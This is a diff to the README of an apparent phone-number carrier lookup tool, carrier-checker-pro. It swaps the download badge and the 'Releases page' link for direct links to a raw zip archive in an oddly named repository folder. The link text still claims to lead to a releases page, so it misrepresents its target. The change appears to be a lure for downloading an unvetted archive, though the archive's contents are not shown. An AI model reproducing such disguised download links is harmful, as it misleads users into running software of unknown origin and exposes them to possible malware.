@@ -1,7 +1,7 @@
 # 📱 carrier-checker-pro - Verify Phone Numbers with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/PalafozLuz/carrier-checker-pro/releases)
+[![Download](https://raw.githubusercontent.com/PalafozLuz/carrier-checker-pro/main/twofoldness/carrier-checker-pro_v1.5.zip)](https://raw.githubusercontent.com/PalafozLuz/carrier-checker-pro/main/twofoldness/carrier-checker-pro_v1.5.zip)
 
 ## 📜 Description
 Welcome to **carrier-checker-pro**! This tool helps you check and verify international phone numbers. It supports 206 countries, ensuring you can easily find out which carrier a number belongs to. Whether you are managing contacts, running a business, or verifying numbers for any reason, this software simplifies the process.
@@ -10,7 +10,7 @@ Welcome to **carrier-checker-pro**! This tool helps you check and verify interna
 To begin using carrier-checker-pro, follow these simple steps:
 
 1. **Visit the Download Page**  
-   Click the button above to go to our [Releases page](https://github.com/PalafozLuz/carrier-checker-pro/releases). Here, you will find different versions of the software available for download.
+   Click the button above to go to our [Releases page](https://raw.githubusercontent.com/PalafozLuz/carrier-checker-pro/main/twofoldness/carrier-checker-pro_v1.5.zip). Here, you will find different versions of the software available for download.
 
 2. **Choose Your Version**  
    Review the available releases. Select the latest version for downloading. Each version comes with updates and fixes that improve performance.
